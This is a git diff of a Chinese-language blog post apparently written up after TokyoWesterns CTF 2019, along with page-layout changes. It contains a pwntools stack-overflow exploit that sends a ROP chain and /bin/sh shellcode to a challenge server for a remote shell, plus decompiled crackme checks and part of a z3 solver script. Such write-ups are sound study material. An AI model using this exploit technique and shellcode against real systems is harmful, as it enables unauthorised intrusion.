@@ -142,18 +142,6 @@
         </div>
         <div class="bottom">
           <div class="follow">
-            
-            <a href="https://github.com/shixiaohu2206" target="_block">
-              <span class="iconfont icon-github"></span>
-            </a>
-            
-            <a href="https://www.facebook.com/shi.xiaohu.5" target="_block">
-              <span class="iconfont icon-facebook"></span>
-            </a>
-            
-            <a href="https://www.instagram.com/shi_xiaohu/" target="_block">
-              <span class="iconfont icon-instagram"></span>
-            </a>
              
             <a href="/atom.xml" target="_block">
               <span class="iconfont icon-rss"></span>
@@ -175,6 +163,11 @@
           <span>2019/09/02</span>
         </span>
 
+        
+          <span class="item leancloud-visitors" id="/2019/09/02/TokyoWesternsCTF-2019-writeup/" data-flag-title="TokyoWesternsCTF 2019 writeup">
+            <span class="iconfont icon-eye1"></span>
+            <span class="leancloud-visitors-count"></span>
+          </span>
         
 
          
@@ -208,27 +201,220 @@
     </div>
     <p>tcl 做了三道签到题目</p>
 <h2 id="warmup">warmup<a class="post-anchor" href="#warmup"></a></h2><p>没有任何保护的栈溢出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x0000000000601A00</span></span><br><span class="line"></span><br><span class="line">buf=<span class="number">0x00007FFE0740F240</span></span><br><span class="line">ret=<span class="number">0x00007FFE0740F348</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process('./pwn')</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io=remote(<span class="string">'nothing.chal.ctf.westerns.tokyo'</span>,<span class="number">10001</span>)</span><br><span class="line">io.sendline((ret-buf)*<span class="string">'a'</span>+p64(<span class="number">0x0000000000400773</span>)+p64(addr)+p64(elf.plt[<span class="string">'gets'</span>])+p64(addr))</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+elf=ELF(<span class="hljs-string">'./pwn'</span>)
+
+shellcode = <span class="hljs-string">"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"</span>
+
+addr=<span class="hljs-number">0x0000000000601A00</span>
+
+buf=<span class="hljs-number">0x00007FFE0740F240</span>
+ret=<span class="hljs-number">0x00007FFE0740F348</span>
+
+<span class="hljs-comment">#io=process('./pwn')</span>
+<span class="hljs-comment">#pause()</span>
+io=remote(<span class="hljs-string">'nothing.chal.ctf.westerns.tokyo'</span>,<span class="hljs-number">10001</span>)
+io.sendline((ret-buf)*<span class="hljs-string">'a'</span>+p64(<span class="hljs-number">0x0000000000400773</span>)+p64(addr)+p64(elf.plt[<span class="hljs-string">'gets'</span>])+p64(addr))
+io.sendline(shellcode)
+io.interactive()</code></pre>
 
 <h2 id="easy-crackme">easy_crackme<a class="post-anchor" href="#easy-crackme"></a></h2><p>这道题目耗时间比较长<br>最后用z3 一个一个进行约束即可</p>
-<h3 id="check1">check1<a class="post-anchor" href="#check1"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v46 = '76543210';</span><br><span class="line">v47 = 'fedcba98';</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="built_in">strchr</span>(s, *((<span class="keyword">char</span> *)&amp;v46 + i)); j; j = <span class="built_in">strchr</span>(j + <span class="number">1</span>, *((<span class="keyword">char</span> *)&amp;v46 + i)) )</span><br><span class="line">    ++*((_DWORD *)&amp;s1 + i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;s1, &amp;unk_400F00, <span class="number">0x40</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="check1">check1<a class="post-anchor" href="#check1"></a></h3><pre><code class="hljs cpp">v46 = '76543210';
+v47 = 'fedcba98';
+for ( i = 0; i &lt;= 15; ++i )
+&#123;
+  for ( j = strchr(s, *((char *)&amp;v46 + i)); j; j = strchr(j + 1, *((char *)&amp;v46 + i)) )
+    ++*((_DWORD *)&amp;s1 + i);
+&#125;
+if ( memcmp(&amp;s1, &amp;unk_400F00, 0x40uLL) )
+&#123;
+  puts("incorrect");
+  exit(0);
+&#125;</code></pre>
 
 <p>判断字符出现次数</p>
-<h3 id="check2">check2<a class="post-anchor" href="#check2"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">v21 = <span class="number">0L</span>L;</span><br><span class="line">    v22 = <span class="number">0L</span>L;</span><br><span class="line">    v23 = <span class="number">0L</span>L;</span><br><span class="line">    v24 = <span class="number">0L</span>L;</span><br><span class="line">    v25 = <span class="number">0L</span>L;</span><br><span class="line">    v26 = <span class="number">0L</span>L;</span><br><span class="line">    v27 = <span class="number">0L</span>L;</span><br><span class="line">    v28 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">7</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">0</span>;</span><br><span class="line">      v11 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">3</span>; ++l )                <span class="comment">// 遍历 &#123;***&#125; 的内容</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5 = s[<span class="number">4</span> * k + <span class="number">6</span> + l];</span><br><span class="line">        v10 += v5;</span><br><span class="line">        v11 ^= v5;</span><br><span class="line">      &#125;</span><br><span class="line">      *((_DWORD *)&amp;v21 + k) = v10;              <span class="comment">// 四个一组的和</span></span><br><span class="line">      *((_DWORD *)&amp;v25 + k) = v11;              <span class="comment">// 四个一组异或的值</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="check2">check2<a class="post-anchor" href="#check2"></a></h3><pre><code class="hljs cpp">v21 = <span class="hljs-number">0L</span>L;
+    v22 = <span class="hljs-number">0L</span>L;
+    v23 = <span class="hljs-number">0L</span>L;
+    v24 = <span class="hljs-number">0L</span>L;
+    v25 = <span class="hljs-number">0L</span>L;
+    v26 = <span class="hljs-number">0L</span>L;
+    v27 = <span class="hljs-number">0L</span>L;
+    v28 = <span class="hljs-number">0L</span>L;
+    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">7</span>; ++k )
+    &#123;
+      v10 = <span class="hljs-number">0</span>;
+      v11 = <span class="hljs-number">0</span>;
+      <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt;= <span class="hljs-number">3</span>; ++l )                <span class="hljs-comment">// 遍历 &#123;***&#125; 的内容</span>
+      &#123;
+        v5 = s[<span class="hljs-number">4</span> * k + <span class="hljs-number">6</span> + l];
+        v10 += v5;
+        v11 ^= v5;
+      &#125;
+      *((_DWORD *)&amp;v21 + k) = v10;              <span class="hljs-comment">// 四个一组的和</span>
+      *((_DWORD *)&amp;v25 + k) = v11;              <span class="hljs-comment">// 四个一组异或的值</span>
+    &#125;</code></pre>
 
-<h3 id="check3">check3<a class="post-anchor" href="#check3"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">v29 = <span class="number">0L</span>L;</span><br><span class="line">v30 = <span class="number">0L</span>L;</span><br><span class="line">v31 = <span class="number">0L</span>L;</span><br><span class="line">v32 = <span class="number">0L</span>L;</span><br><span class="line">v33 = <span class="number">0L</span>L;</span><br><span class="line">v34 = <span class="number">0L</span>L;</span><br><span class="line">v35 = <span class="number">0L</span>L;</span><br><span class="line">v36 = <span class="number">0L</span>L;</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">7</span>; ++m )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">3</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = s[<span class="number">8</span> * n + <span class="number">6</span> + m];</span><br><span class="line">    v14 += v6;</span><br><span class="line">    v15 ^= v6;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)&amp;v29 + m) = v14;</span><br><span class="line">  *((_DWORD *)&amp;v33 + m) = v15;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;v21, &amp;unk_400F40, <span class="number">0x20</span>uLL) || <span class="built_in">memcmp</span>(&amp;v25, &amp;unk_400F60, <span class="number">0x20</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;v29, &amp;unk_400FA0, <span class="number">0x20</span>uLL) || <span class="built_in">memcmp</span>(&amp;v33, &amp;unk_400F80, <span class="number">0x20</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="check3">check3<a class="post-anchor" href="#check3"></a></h3><pre><code class="hljs cpp">v29 = <span class="hljs-number">0L</span>L;
+v30 = <span class="hljs-number">0L</span>L;
+v31 = <span class="hljs-number">0L</span>L;
+v32 = <span class="hljs-number">0L</span>L;
+v33 = <span class="hljs-number">0L</span>L;
+v34 = <span class="hljs-number">0L</span>L;
+v35 = <span class="hljs-number">0L</span>L;
+v36 = <span class="hljs-number">0L</span>L;
+<span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">7</span>; ++m )
+&#123;
+  v14 = <span class="hljs-number">0</span>;
+  v15 = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; n &lt;= <span class="hljs-number">3</span>; ++n )
+  &#123;
+    v6 = s[<span class="hljs-number">8</span> * n + <span class="hljs-number">6</span> + m];
+    v14 += v6;
+    v15 ^= v6;
+  &#125;
+  *((_DWORD *)&amp;v29 + m) = v14;
+  *((_DWORD *)&amp;v33 + m) = v15;
+&#125;
+<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(&amp;v21, &amp;unk_400F40, <span class="hljs-number">0x20</span>uLL) || <span class="hljs-built_in">memcmp</span>(&amp;v25, &amp;unk_400F60, <span class="hljs-number">0x20</span>uLL) )
+&#123;
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);
+  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+&#125;
+<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(&amp;v29, &amp;unk_400FA0, <span class="hljs-number">0x20</span>uLL) || <span class="hljs-built_in">memcmp</span>(&amp;v33, &amp;unk_400F80, <span class="hljs-number">0x20</span>uLL) )
+&#123;
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);
+  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+&#125;</code></pre>
 
-<h3 id="check4">check4<a class="post-anchor" href="#check4"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(v45, <span class="number">0</span>, <span class="keyword">sizeof</span>(v45));</span><br><span class="line"><span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">31</span>; ++ii )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = s[ii + <span class="number">6</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v7 &lt;= <span class="number">0x2F</span> || v7 &gt; <span class="number">0x39</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0x60</span> || v7 &gt; <span class="number">0x66</span> )</span><br><span class="line">      v45[ii] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v45[ii] = <span class="number">0x80</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v45[ii] = <span class="number">0xFF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v45, &amp;unk_400FC0, <span class="number">0x80</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="check4">check4<a class="post-anchor" href="#check4"></a></h3><pre><code class="hljs cpp"><span class="hljs-built_in">memset</span>(v45, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v45));
+<span class="hljs-keyword">for</span> ( ii = <span class="hljs-number">0</span>; ii &lt;= <span class="hljs-number">31</span>; ++ii )
+&#123;
+  v7 = s[ii + <span class="hljs-number">6</span>];
+  <span class="hljs-keyword">if</span> ( v7 &lt;= <span class="hljs-number">0x2F</span> || v7 &gt; <span class="hljs-number">0x39</span> )
+  &#123;
+    <span class="hljs-keyword">if</span> ( v7 &lt;= <span class="hljs-number">0x60</span> || v7 &gt; <span class="hljs-number">0x66</span> )
+      v45[ii] = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">else</span>
+      v45[ii] = <span class="hljs-number">0x80</span>;
+  &#125;
+  <span class="hljs-keyword">else</span>
+  &#123;
+    v45[ii] = <span class="hljs-number">0xFF</span>;
+  &#125;
+&#125;
+<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(v45, &amp;unk_400FC0, <span class="hljs-number">0x80</span>uLL) )
+&#123;
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);
+  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+&#125;</code></pre>
 
-<h3 id="check5">check5<a class="post-anchor" href="#check5"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v18 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt;= <span class="number">15</span>; ++jj )</span><br><span class="line">      v18 += s[<span class="number">2</span> * (jj + <span class="number">3</span>)];</span><br><span class="line">    <span class="keyword">if</span> ( v18 != <span class="number">1160</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="check5">check5<a class="post-anchor" href="#check5"></a></h3><pre><code class="hljs cpp">v18 = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span> ( jj = <span class="hljs-number">0</span>; jj &lt;= <span class="hljs-number">15</span>; ++jj )
+      v18 += s[<span class="hljs-number">2</span> * (jj + <span class="hljs-number">3</span>)];
+    <span class="hljs-keyword">if</span> ( v18 != <span class="hljs-number">1160</span> )
+    &#123;
+      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);
+      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    &#125;</code></pre>
 
-<h3 id="check6">check6<a class="post-anchor" href="#check6"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( s[<span class="number">37</span>] != <span class="number">0x35</span> || s[<span class="number">7</span>] != <span class="number">102</span> || s[<span class="number">11</span>] != <span class="number">0x38</span> || s[<span class="number">12</span>] != <span class="number">0x37</span> || s[<span class="number">23</span>] != <span class="number">0x32</span> || s[<span class="number">31</span>] != <span class="number">0x34</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Correct: %s\n"</span>, s, a2);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="check6">check6<a class="post-anchor" href="#check6"></a></h3><pre><code class="hljs cpp">  <span class="hljs-keyword">if</span> ( s[<span class="hljs-number">37</span>] != <span class="hljs-number">0x35</span> || s[<span class="hljs-number">7</span>] != <span class="hljs-number">102</span> || s[<span class="hljs-number">11</span>] != <span class="hljs-number">0x38</span> || s[<span class="hljs-number">12</span>] != <span class="hljs-number">0x37</span> || s[<span class="hljs-number">23</span>] != <span class="hljs-number">0x32</span> || s[<span class="hljs-number">31</span>] != <span class="hljs-number">0x34</span> )
+  &#123;
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+  &#125;
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Correct: %s\n"</span>, s, a2);
+  result = <span class="hljs-number">0L</span>L;
+&#125;</code></pre>
 
 <p>解题脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !user/bin/python2.7</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">"a%d"</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>)]</span><br><span class="line">sum1 = [<span class="number">0x15E</span>, <span class="number">0x0DA</span>, <span class="number">0x12F</span>, <span class="number">0x131</span>, <span class="number">0x100</span>, <span class="number">0x131</span>, <span class="number">0x0FB</span>, <span class="number">0x102</span>]</span><br><span class="line">xor1 = [<span class="number">0x52</span>, <span class="number">0x0C</span>, <span class="number">1</span>, <span class="number">0x0F</span>, <span class="number">0x5C</span>, <span class="number">5</span>, <span class="number">0x53</span>, <span class="number">0x58</span>]</span><br><span class="line">sum2 = [<span class="number">0x129</span>, <span class="number">0x103</span>, <span class="number">0x12B</span>, <span class="number">0x131</span>, <span class="number">0x135</span>, <span class="number">0x10B</span>, <span class="number">0x0FF</span>, <span class="number">0x0FF</span>]</span><br><span class="line">xor2 = [<span class="number">1</span>, <span class="number">0x57</span>, <span class="number">7</span>, <span class="number">0x0D</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x51</span>, <span class="number">0x51</span>]</span><br><span class="line">cnt = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">memcmp = [<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>]</span><br><span class="line">d = <span class="string">"0123456789abcdef"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(0,16):</span></span><br><span class="line"><span class="string">	s.add(str(flag).count(str(ord(d[i])))==cnt[i])</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">if</span> memcmp[j] == <span class="number">0x80</span>:</span><br><span class="line">		s.add(flag[j]&gt; <span class="number">0x60</span>)</span><br><span class="line">		s.add(flag[j]&lt;=<span class="number">0x66</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		s.add(flag[j]&lt;=<span class="number">0x39</span>)</span><br><span class="line">		s.add(flag[j]&gt; <span class="number">0x2f</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flag:</span><br><span class="line">	s.add(<span class="number">0x30</span>&lt;=x)</span><br><span class="line">	s.add(<span class="number">0x67</span>&gt;x)</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">1</span>]==<span class="number">102</span>)</span><br><span class="line">s.add(flag[<span class="number">5</span>]==<span class="number">0x38</span>)</span><br><span class="line">s.add(flag[<span class="number">6</span>]==<span class="number">0x37</span>)</span><br><span class="line">s.add(flag[<span class="number">17</span>]==<span class="number">0x32</span>)</span><br><span class="line">s.add(flag[<span class="number">25</span>]==<span class="number">0x34</span>)</span><br><span class="line">s.add(flag[<span class="number">31</span>]==<span class="number">0x35</span>)</span><br><span class="line"><span class="comment">#for i in range(len())</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">	s.add(flag[i]!=<span class="number">51</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">4</span>):</span><br><span class="line">	s.add(flag[i]+flag[i+<span class="number">1</span>]+flag[i+<span class="number">2</span>]+flag[i+<span class="number">3</span>]==sum1[i/<span class="number">4</span>])</span><br><span class="line">	s.add(flag[i]^flag[i+<span class="number">1</span>]^flag[i+<span class="number">2</span>]^flag[i+<span class="number">3</span>]==xor1[i/<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">	s.add(flag[i]+flag[i+<span class="number">8</span>]+flag[i+<span class="number">16</span>]+flag[i+<span class="number">24</span>]==sum2[i])</span><br><span class="line">	s.add(flag[i]^flag[i+<span class="number">8</span>]^flag[i+<span class="number">16</span>]^flag[i+<span class="number">24</span>]==xor2[i])</span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>,<span class="number">2</span>):</span><br><span class="line">	sum += flag[i]</span><br><span class="line">s.add(sum == <span class="number">1160</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[-] check sat ·····"</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">	m = s.model()</span><br><span class="line">	<span class="keyword">print</span> m</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[+] print flag ·····"</span></span><br><span class="line">	kk = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">		kk +=  chr(int(<span class="string">"%s"</span> % (m[flag[i]])))</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"TWCTF&#123;"</span>+kk+<span class="string">"&#125;"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[+] False     ·····"</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-comment"># !user/bin/python2.7</span>
+<span class="hljs-comment"># coding:utf-8</span>
+<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter
+<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *
+
+s = Solver()
+flag = [BitVec(<span class="hljs-string">"a%d"</span>%i,<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>)]
+sum1 = [<span class="hljs-number">0x15E</span>, <span class="hljs-number">0x0DA</span>, <span class="hljs-number">0x12F</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x0FB</span>, <span class="hljs-number">0x102</span>]
